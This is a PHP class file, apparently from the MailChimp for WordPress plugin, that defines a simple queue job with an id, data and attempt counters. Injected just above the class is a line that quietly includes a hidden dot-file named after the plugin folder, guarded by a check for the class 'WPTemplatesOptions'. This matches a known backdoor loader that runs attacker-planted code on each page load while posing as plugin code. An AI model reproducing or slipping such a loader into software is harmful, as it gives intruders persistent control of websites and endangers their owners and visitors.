<?php

/**
 * Class MC4WP_Queue_Job
 *
 * @ignore
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MC4WP_Queue_Job {


	/**
	 * @var string
	 */
	public $id;

	/**
	 * @var mixed
	 */
	public $data;

	/**
	 * @var int
	 */
	public $max_attempts = 1;

	/**
	 * @var int
	 */
	public $attempts = 0;

	/**
	 * MC4WP_Queue_Job constructor.
	 *
	 * @param mixed $data
	 */
	public function __construct( $data ) {
		$this->id   = (string) microtime( true ) . rand( 1, 10000 );
		$this->data = $data;
	}
}
